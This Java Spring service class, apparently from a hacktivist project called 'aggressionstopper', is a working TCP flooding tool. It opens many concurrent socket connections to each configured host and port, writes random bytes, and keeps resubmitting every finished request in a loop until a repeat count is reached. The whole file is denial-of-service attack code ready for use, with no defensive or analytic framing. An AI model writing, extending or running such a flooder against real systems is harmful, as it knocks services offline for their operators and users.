package net.cyberkatyusha.aggressionstopper.service;

import net.cyberkatyusha.aggressionstopper.config.AggressionStopperSettings;
import net.cyberkatyusha.aggressionstopper.model.TcpAddress;
import net.cyberkatyusha.aggressionstopper.model.TcpRequestExecutionResult;
import net.cyberkatyusha.aggressionstopper.model.TcpRequestFuture;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadLocalRandom;

@Service
public class AggressionsStopperTcpService {

    private static final Logger logger = LoggerFactory.getLogger(AggressionsStopperTcpService.class);

    private final AggressionStopperSettings settings;

    public AggressionsStopperTcpService(AggressionStopperSettings settings) {
        this.settings = settings;
    }

    public void execute() {

        logger.info("Execution started");

        Long requestNumber = 0L;

        List<TcpRequestFuture> requestFutureList = new ArrayList<>();

        ExecutorService executorService = Executors.newCachedThreadPool();

        byte[] firstRandomBytes = getRandomBytes();

        for (TcpAddress address : settings.getTcpAddresses()) {
            for (int i = 0; i < settings.getRequestCount(); i++) {
                Future<TcpRequestExecutionResult> future = executorService.submit(() -> sendRequest(address, firstRandomBytes));
                requestFutureList.add(new TcpRequestFuture(address, future));
            }
        }

        while (requestNumber < settings.getRequestsRepeatCount()) {

            byte[] secondRandomBytes = getRandomBytes();

            List<TcpRequestFuture> doneFutureList = new ArrayList<>();
            List<TcpRequestFuture> canceledFutureList = new ArrayList<>();

            for (TcpRequestFuture requestFuture : requestFutureList) {

                Future<TcpRequestExecutionResult> future = requestFuture.getFuture();

                if (future.isDone()) {
                    doneFutureList.add(requestFuture);
                    TcpRequestExecutionResult requestExecutionResult = getRequestResult(requestFuture.getAddress(), future);
                } else if (future.isCancelled()) {
                    canceledFutureList.add(requestFuture);
                }

                if (future.isDone() || future.isCancelled()) {
                    requestNumber++;
                    if (requestNumber % settings.getLogEachItemNumber() == 0) {
                        logger.info("Request number: %d".formatted(requestNumber));
                    }
                }
            }

            requestFutureList.removeAll(doneFutureList);
            requestFutureList.removeAll(canceledFutureList);

            for (TcpRequestFuture requestFuture : doneFutureList) {

                Future<TcpRequestExecutionResult> future = executorService.submit(
                        () -> sendRequest(
                                requestFuture.getAddress(),
                                secondRandomBytes
                        )
                );

                requestFutureList.add(new TcpRequestFuture(requestFuture.getAddress(), future));
            }

            for (TcpRequestFuture requestFuture : canceledFutureList) {
                Future<TcpRequestExecutionResult> future = executorService.submit(
                        () -> sendRequest(
                                requestFuture.getAddress(),
                                secondRandomBytes
                        )
                );

                requestFutureList.add(new TcpRequestFuture(requestFuture.getAddress(), future));
            }

            try {
                Thread.sleep(settings.getRequestsDelayMillis());
            } catch (InterruptedException e) {
                //do nothing
            }

        }

        executorService.shutdown();

        logger.info("Execution finished");

    }

    private TcpRequestExecutionResult getRequestResult(TcpAddress address, Future<TcpRequestExecutionResult> future) {

        TcpRequestExecutionResult result;

        try {
            result = future.get();
        } catch (Throwable t) {
            result = new TcpRequestExecutionResult(address, false);
        }

        return result;
    }

    private TcpRequestExecutionResult sendRequest(TcpAddress address, byte[] bytes) {
        boolean success;

        try (Socket socket = new Socket()) {

            socket.setSoTimeout(settings.getSocketClientSettings().getSoTimeoutMillis());

            socket.connect(
                    new InetSocketAddress(address.getHost(), address.getPort()),
                    settings.getSocketClientSettings().getConnectTimeoutMillis()
            );

            try (OutputStream outputStream = socket.getOutputStream()) {
                outputStream.write(bytes);
                success = true;

            } catch (Throwable t) {
                success = false;
            }

        } catch (Throwable t) {
            success = false;
        }

        return new TcpRequestExecutionResult(address, success);
    }

    private byte[] getRandomBytes() {
        final byte[] bytes = new byte[getRandomNumberUsingInts(1, 255)];
        ThreadLocalRandom.current().nextBytes(bytes);
        return bytes;
    }

    private int getRandomNumberUsingInts(int min, int max) {
        Random random = new Random();
        return random.ints(min, max).findFirst().orElse(128);
    }

}
